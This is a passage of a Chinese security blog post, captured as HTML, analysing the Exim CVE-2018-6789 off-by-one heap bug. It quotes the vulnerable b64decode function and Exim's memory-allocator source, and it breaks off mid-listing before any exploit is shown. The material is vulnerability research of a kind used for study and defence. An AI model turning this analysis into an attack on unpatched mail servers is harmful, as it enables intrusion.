<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="漏洞复现," />










<meta name="description" content="漏洞原理在base64.c中的b64decode函数，存在off by one的漏洞。下面的代码中，先根据code的长度分配内存。由于在encode时会按照三个字节一组转换为四字节，decode时则是四个字节一组转换为三字节。当code的长度为4n+3时，则会分配3n+1长度的内存。但是参照代码，实际会分配3n+2个字节。 1234567891011121314151617181920212223">
<meta name="keywords" content="漏洞复现">
<meta property="og:type" content="article">
<meta property="og:title" content="Exim Off by one CVE-2018-6789漏洞复现">
<meta property="og:url" content="http://0gur1.cc/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/index.html">
<meta property="og:site_name" content="0gur1">
<meta property="og:description" content="漏洞原理在base64.c中的b64decode函数，存在off by one的漏洞。下面的代码中，先根据code的长度分配内存。由于在encode时会按照三个字节一组转换为四字节，decode时则是四个字节一组转换为三字节。当code的长度为4n+3时，则会分配3n+1长度的内存。但是参照代码，实际会分配3n+2个字节。 1234567891011121314151617181920212223">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://0gur1.cc/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/1.png">
<meta property="og:image" content="http://0gur1.cc/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/2.png">
<meta property="og:image" content="http://0gur1.cc/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/3.png">
<meta property="og:image" content="http://0gur1.cc/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/4.png">
<meta property="og:image" content="http://0gur1.cc/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/5.png">
<meta property="og:image" content="http://0gur1.cc/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/6.png">
<meta property="og:image" content="http://0gur1.cc/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/7.png">
<meta property="og:image" content="http://0gur1.cc/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/8.png">
<meta property="og:image" content="http://0gur1.cc/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/9.png">
<meta property="og:image" content="http://0gur1.cc/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/a.png">
<meta property="og:image" content="http://0gur1.cc/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/b.png">
<meta property="og:updated_time" content="2019-03-07T10:09:10.423Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Exim Off by one CVE-2018-6789漏洞复现">
<meta name="twitter:description" content="漏洞原理在base64.c中的b64decode函数，存在off by one的漏洞。下面的代码中，先根据code的长度分配内存。由于在encode时会按照三个字节一组转换为四字节，decode时则是四个字节一组转换为三字节。当code的长度为4n+3时，则会分配3n+1长度的内存。但是参照代码，实际会分配3n+2个字节。 1234567891011121314151617181920212223">
<meta name="twitter:image" content="http://0gur1.cc/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
	  applicationID: '7MHLMVVD1M',
      apiKey: 'dbb74cd528079f8c1d1a6138e9ed5b67',
      indexName: 'test_hexo',
      hits: "",
      labels: ""
    }
  };
</script>



  <link rel="canonical" href="http://0gur1.cc/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/"/>





  <title>Exim Off by one CVE-2018-6789漏洞复现 | 0gur1</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">0gur1</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  <!-- -->
  
  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      

    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://0gur1.cc/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="0gur1">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="0gur1">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Exim Off by one CVE-2018-6789漏洞复现</h1>
        

        <div class="post-meta">
		  
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-16T15:14:24+08:00">
                2019-02-16
              </time>
            

            

            
          </span>

          

          
            
          

          
          
             <span id="/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/" class="leancloud_visitors" data-flag-title="Exim Off by one CVE-2018-6789漏洞复现">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  5,512字
                </span>
              

              

              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>在base64.c中的b64decode函数，存在off by one的漏洞。下面的代码中，先根据code的长度分配内存。由于在encode时会按照三个字节一组转换为四字节，decode时则是四个字节一组转换为三字节。当code的长度为4n+3时，则会分配3n+1长度的内存。但是参照代码，实际会分配3n+2个字节。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">b64decode(<span class="keyword">const</span> uschar *code, uschar **ptr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> x, y;</span><br><span class="line">  <span class="comment">//漏洞所在</span></span><br><span class="line">uschar *result = store_get(<span class="number">3</span>*(Ustrlen(code)/<span class="number">4</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">*ptr = result;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Each cycle of the loop handles a quantum of 4 input bytes. For the last</span></span><br><span class="line"><span class="comment">quantum this may decode to 1, 2, or 3 output bytes. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((x = *code++) != <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">isspace</span>(x)) <span class="keyword">continue</span>;</span><br><span class="line">  <span class="comment">/* debug_printf("b64d: '%c'\n", x); */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (x &gt; <span class="number">127</span> || (x = dec64table[x]) == <span class="number">255</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">isspace</span>(y = *code++)) ;</span><br><span class="line">  <span class="comment">/* debug_printf("b64d: '%c'\n", y); */</span></span><br><span class="line">  <span class="keyword">if</span> (y == <span class="number">0</span> || (y = dec64table[y]) == <span class="number">255</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  *result++ = (x &lt;&lt; <span class="number">2</span>) | (y &gt;&gt; <span class="number">4</span>);</span><br><span class="line">  <span class="comment">/* debug_printf("b64d:      -&gt; %02x\n", result[-1]); */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">isspace</span>(x = *code++)) ;</span><br><span class="line">  <span class="comment">/* debug_printf("b64d: '%c'\n", x); */</span></span><br><span class="line">  <span class="keyword">if</span> (x == <span class="string">'='</span>)		<span class="comment">/* endmarker, but there should be another */</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">isspace</span>(x = *code++)) ;</span><br><span class="line">    <span class="comment">/* debug_printf("b64d: '%c'\n", x); */</span></span><br><span class="line">    <span class="keyword">if</span> (x != <span class="string">'='</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">isspace</span>(y = *code++)) ;</span><br><span class="line">    <span class="keyword">if</span> (y != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">/* debug_printf("b64d: DONE\n"); */</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span> (x &gt; <span class="number">127</span> || (x = dec64table[x]) == <span class="number">255</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    *result++ = (y &lt;&lt; <span class="number">4</span>) | (x &gt;&gt; <span class="number">2</span>);</span><br><span class="line">    <span class="comment">/* debug_printf("b64d:      -&gt; %02x\n", result[-1]); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">isspace</span>(y = *code++)) ;</span><br><span class="line">    <span class="comment">/* debug_printf("b64d: '%c'\n", y); */</span></span><br><span class="line">    <span class="keyword">if</span> (y == <span class="string">'='</span>)</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">while</span> (<span class="built_in">isspace</span>(y = *code++)) ;</span><br><span class="line">      <span class="keyword">if</span> (y != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      <span class="comment">/* debug_printf("b64d: DONE\n"); */</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">if</span> (y &gt; <span class="number">127</span> || (y = dec64table[y]) == <span class="number">255</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      *result++ = (x &lt;&lt; <span class="number">6</span>) | y;</span><br><span class="line">      <span class="comment">/* debug_printf("b64d:      -&gt; %02x\n", result[-1]); */</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">*result = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> result - *ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">假设code剩余的<span class="number">3</span>个字节分别是c1,c2,c3.前面的<span class="number">4</span>n个字节被decode为<span class="number">3</span>n个字节。</span><br><span class="line">  d1 = c1&lt;&lt;<span class="number">2</span>|c2&gt;&gt;<span class="number">4</span></span><br><span class="line">  d2 = c2&lt;&lt;<span class="number">4</span>|c3&gt;&gt;<span class="number">2</span></span><br><span class="line"><span class="number">4</span>n+<span class="number">3</span> ===&gt; <span class="number">3</span>n+<span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>off by one漏洞可以用于堆中对下一个chunk的size的覆写，修改了size就有机会堆溢出，覆盖其他chunk的内容。因此首先了解一下Exim的内存管理机制，方便后续的利用。</p>
<h1 id="Exim的内存管理"><a href="#Exim的内存管理" class="headerlink" title="Exim的内存管理"></a>Exim的内存管理</h1><h2 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h2><p>Exim有自己的一套内存管理机制。如下图所示，storeblock结构包含next指针和length，next指向下一块storeblock，length的最小长度为0x2000，storeblock则是由glibc的malloc分配的。这些storeblock以单向链表的形式组织起来，由chainbase记录头结点。yield_length为当前storeblock剩余可用的长度，next_yield指向未被分配的地址。用store_get函数申请内存（下面有详细讲解），申请的大小小于yield_length时就在当前storeblock的next_yield处开始分配；否则就再申请一块新的storeblock。</p>
<p><img src="/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/1.png" alt="meh的图"></p>
<p>管理内存的关键函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> store_free(addr)     store_free_3(addr, __FILE__, __LINE__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> store_get(size)      store_get_3(size, __FILE__, __LINE__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> store_malloc(size)   store_malloc_3(size, __FILE__, __LINE__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> store_reset(addr)    store_reset_3(addr, __FILE__, __LINE__)</span></span><br></pre></td></tr></table></figure></p>
<h2 id="store-get-3函数"><a href="#store-get-3函数" class="headerlink" title="store_get_3函数"></a>store_get_3函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">store_get_3(<span class="keyword">int</span> size, <span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">int</span> linenumber)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* Round up the size to a multiple of the alignment. Although this looks a</span></span><br><span class="line"><span class="comment">messy statement, because "alignment" is a constant expression, the compiler can</span></span><br><span class="line"><span class="comment">do a reasonable job of optimizing, especially if the value of "alignment" is a</span></span><br><span class="line"><span class="comment">power of two. I checked this with -O2, and gcc did very well, compiling it to 4</span></span><br><span class="line"><span class="comment">instructions on a Sparc (alignment = 8). */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//将size调整为以8对齐</span></span><br><span class="line"><span class="keyword">if</span> (size % alignment != <span class="number">0</span>) size += alignment - (size % alignment);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* If there isn't room in the current block, get a new one. The minimum</span></span><br><span class="line"><span class="comment">size is STORE_BLOCK_SIZE, and we would expect this to be the norm, since</span></span><br><span class="line"><span class="comment">these functions are mostly called for small amounts of store. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果申请的大小大于当前storeblock剩余大小</span></span><br><span class="line"><span class="keyword">if</span> (size &gt; yield_length[store_pool])</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="comment">//STORE_BLOCK_SIZE为0x2000,ALIGNED_SIZEOF_STOREBLOCK为0x10</span></span><br><span class="line">  <span class="keyword">int</span> length = (size &lt;= STORE_BLOCK_SIZE)? STORE_BLOCK_SIZE : size;</span><br><span class="line">  <span class="keyword">int</span> mlength = length + ALIGNED_SIZEOF_STOREBLOCK;</span><br><span class="line">  storeblock * newblock = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sometimes store_reset() may leave a block for us; check if we can use it */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//如果当前storeblock有next，且next小于length,释放掉next storeblock</span></span><br><span class="line">  <span class="keyword">if</span> (  (newblock = current_block[store_pool])</span><br><span class="line">     &amp;&amp; (newblock = newblock-&gt;next)</span><br><span class="line">     &amp;&amp; newblock-&gt;length &lt; length</span><br><span class="line">     )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">/* Give up on this block, because it's too small */</span></span><br><span class="line">    store_free(newblock);</span><br><span class="line">    newblock = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If there was no free block, get a new one */</span></span><br><span class="line"> <span class="comment">//store_malloc申请新的storeblock</span></span><br><span class="line">  <span class="keyword">if</span> (!newblock)</span><br><span class="line">    &#123;</span><br><span class="line">    pool_malloc += mlength;           <span class="comment">/* Used in pools */</span></span><br><span class="line">    nonpool_malloc -= mlength;        <span class="comment">/* Exclude from overall total */</span></span><br><span class="line">    newblock = store_malloc(mlength); <span class="comment">//调用store_malloc分配空间，store_malloc见下文</span></span><br><span class="line">    newblock-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    newblock-&gt;length = length;</span><br><span class="line">    <span class="keyword">if</span> (!chainbase[store_pool])</span><br><span class="line">      chainbase[store_pool] = newblock;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      current_block[store_pool]-&gt;next = newblock;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//设置current_block，yield_length,next_yield</span></span><br><span class="line">  current_block[store_pool] = newblock;</span><br><span class="line">  yield_length[store_pool] = newblock-&gt;length;</span><br><span class="line">  next_yield[store_pool] =</span><br><span class="line">    (<span class="keyword">void</span> *)(CS current_block[store_pool] + ALIGNED_SIZEOF_STOREBLOCK);</span><br><span class="line">  (<span class="keyword">void</span>) VALGRIND_MAKE_MEM_NOACCESS(next_yield[store_pool], yield_length[store_pool]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There's (now) enough room in the current block; the yield is the next</span></span><br><span class="line"><span class="comment">pointer. */</span></span><br><span class="line"><span class="comment">//store_last_get记录最后一次获取内存的地址</span></span><br><span class="line">store_last_get[store_pool] = next_yield[store_pool];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Cut out the debugging stuff for utilities, but stop picky compilers from</span></span><br><span class="line"><span class="comment">giving warnings. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> COMPILE_UTILITY</span></span><br><span class="line">filename = filename;</span><br><span class="line">linenumber = linenumber;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">DEBUG(D_memory)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">if</span> (running_in_test_harness)</span><br><span class="line">    debug_printf(<span class="string">"---%d Get %5d\n"</span>, store_pool, size);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    debug_printf(<span class="string">"---%d Get %6p %5d %-14s %4d\n"</span>, store_pool,</span><br><span class="line">      store_last_get[store_pool], size, filename, linenumber);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* COMPILE_UTILITY */</span></span></span><br><span class="line"><span class="comment">//从store_last_get指向的内存分配size，并更新next_yield,yield_length</span></span><br><span class="line">(<span class="keyword">void</span>) VALGRIND_MAKE_MEM_UNDEFINED(store_last_get[store_pool], size);</span><br><span class="line"><span class="comment">/* Update next pointer and number of bytes left in the current block. */</span></span><br><span class="line"></span><br><span class="line">next_yield[store_pool] = (<span class="keyword">void</span> *)(CS next_yield[store_pool] + size);</span><br><span class="line">yield_length[store_pool] -= size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> store_last_get[store_pool];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="store-free-3函数"><a href="#store-free-3函数" class="headerlink" title="store_free_3函数"></a>store_free_3函数</h2><p>除了调试信息之外，是直接调用glibc的free函数进行释放。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">store_free_3(<span class="keyword">void</span> *block, <span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">int</span> linenumber)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> COMPILE_UTILITY</span></span><br><span class="line">filename = filename;</span><br><span class="line">linenumber = linenumber;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">DEBUG(D_memory)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">if</span> (running_in_test_harness)</span><br><span class="line">    debug_printf(<span class="string">"----Free\n"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    debug_printf(<span class="string">"----Free %6p %-20s %4d\n"</span>, block, filename, linenumber);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* COMPILE_UTILITY */</span></span></span><br><span class="line"><span class="built_in">free</span>(block);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="store-malloc-3函数"><a href="#store-malloc-3函数" class="headerlink" title="store_malloc_3函数"></a>store_malloc_3函数</h2><p>store_malloc函数就是调用glibc的malloc函数分配内存。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">store_malloc_3(<span class="keyword">int</span> size, <span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">int</span> linenumber)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">void</span> *yield;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &lt; <span class="number">16</span>) size = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(yield = <span class="built_in">malloc</span>((<span class="keyword">size_t</span>)size)))</span><br><span class="line">  log_write(<span class="number">0</span>, LOG_MAIN|LOG_PANIC_DIE, <span class="string">"failed to malloc %d bytes of memory: "</span></span><br><span class="line">    <span class="string">"called from line %d of %s"</span>, size, linenumber, filename);</span><br><span class="line"></span><br><span class="line">nonpool_malloc += size;</span><br><span class="line"></span><br><span class="line">……</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> yield;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="store-reset-3函数"><a href="#store-reset-3函数" class="headerlink" title="store_reset_3函数"></a>store_reset_3函数</h2><p>该函数释放除指定ptr所在storeblock之外的其他storeblock。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 